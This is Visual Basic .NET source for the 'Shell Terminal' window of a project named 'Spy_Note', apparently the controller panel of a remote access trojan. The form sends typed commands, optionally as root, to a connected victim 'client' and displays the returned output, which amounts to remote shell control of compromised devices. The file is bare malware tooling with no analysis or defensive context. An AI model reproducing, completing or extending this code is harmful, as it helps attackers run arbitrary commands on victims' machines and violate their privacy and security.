Imports System.IO
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Shell_Terminal
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public Sub Client_data(data As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim flag2 As Boolean = data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]")
                If flag2 Then
                    Dim separator As String() = New String() {"[My/Exception]"}
                    Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                    Me.DataGridView1.Rows.Add(New Object() {Me.DataGridView1.RowCount - 1, "Shell Terminal : " + Me.Client_remote_Address + " Outputs>", array(0)})
                    Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(2).Style.ForeColor = Color.Salmon
                    Me.ToEnd()
                Else
                    Dim separator2 As String() = New String() {My.Forms.Form1.s.split_Line}
                    Dim array2 As String() = data.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                    Dim num As Integer = array2.Length - 1
                    For i As Integer = 0 To num
                        Me.DataGridView1.Rows.Add(New Object() {Me.DataGridView1.RowCount - 1, "Shell Terminal : " + Me.Client_remote_Address + " Outputs>", array2(i)})
                        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(2).Style.BackColor = Color.FromArgb(10, 10, 10)
                        Me.ToEnd()
                    Next
                End If
                Me.refres_title()
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ToEnd()
        Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.DataGridView1.RowCount - 1
        Me.DataGridView1.CurrentCell = Nothing
        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Selected = True
    End Sub

    Private Sub Shell_Terminal_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.CopyToolStripMenuItem.Image = store_0.Bitmap_0("ctx_copy")
        Me.EditToolStripMenuItem.Image = store_0.Bitmap_0("ctx_edit")
        Me.ContextMenuStrip1.Renderer = New Theme_0()
        Dim array As String() = File.ReadAllLines(Application.StartupPath + "\" + store_0.name_folder_app_resource + "\Terminal.inf")
        For Each text As String In array
            Me.TextBox1.AutoCompleteCustomSource.AddRange(New String() {text})
        Next
        Me.refres_title()
        MyBase.Icon = store_0.icons_0("window")
    End Sub

    Private Sub refres_title()
        Dim text As String = String.Format("Shell Terminal - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", New Object() {Me.Client_remote_Address, Me.Name_Client, Conversions.ToString(Me.DataGridView1.Rows.Count), Conversions.ToString(Me.DataGridView1.SelectedRows.Count)})
        Me.Text = text
    End Sub

    Public Sub Send(IP As String, Data As String)
        Try
            Dim checked As Boolean = Me.CheckBox1.Checked
            If checked Then
                Me.DataGridView1.Rows.Add(New Object() {Me.DataGridView1.RowCount - 1, IP, "@root " + Data})
                Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(2).Style.ForeColor = Color.RosyBrown
                My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"shell_terminal", My.Forms.Form1.s.SplitData, Data, My.Forms.Form1.s.SplitData, "root@"}))
            Else
                Me.DataGridView1.Rows.Add(New Object() {Me.DataGridView1.RowCount - 1, IP, Data})
                Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(2).Style.ForeColor = Color.LightSeaGreen
                My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"shell_terminal", My.Forms.Form1.s.SplitData, Data, My.Forms.Form1.s.SplitData, "0"}))
            End If
            Me.ToEnd()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub TextBox1_GotFocus(sender As Object, e As EventArgs) Handles TextBox1.GotFocus
        Me.DataGridView1.EditMode = DataGridViewEditMode.EditProgrammatically
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        Dim flag As Boolean = e.KeyCode = Keys.[Return]
        If flag Then
            Me.Send("Shell Terminal : " + Me.Client_remote_Address + " Input>", Me.TextBox1.Text)
            Me.TextBox1.Text = String.Empty
        End If
    End Sub

    Private Sub EditToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditToolStripMenuItem.Click
        Me.DataGridView1.EditMode = DataGridViewEditMode.EditOnEnter
    End Sub

    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        Me.refres_title()
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem.Click
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Me.DataGridView1.Rows.RemoveAt(Me.DataGridView1.SelectedRows(i).Index)
            Next
        End If
    End Sub

    Private Sub CleanToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CleanToolStripMenuItem.Click
        Me.DataGridView1.Rows.Clear()
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Dim stringBuilder As StringBuilder = New StringBuilder()
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Dim str As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                Dim str2 As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(2).Value)
                stringBuilder.Append(str + Strings.Space(1) + str2 + vbCrLf)
            Next
            Dim flag2 As Boolean = Operators.CompareString(stringBuilder.ToString(), Nothing, False) <> 0
            If flag2 Then
                Try
                    My.Computer.Clipboard.SetText(stringBuilder.ToString().Trim())
                Catch ex As Exception
                End Try
            End If
        End If
    End Sub
End Class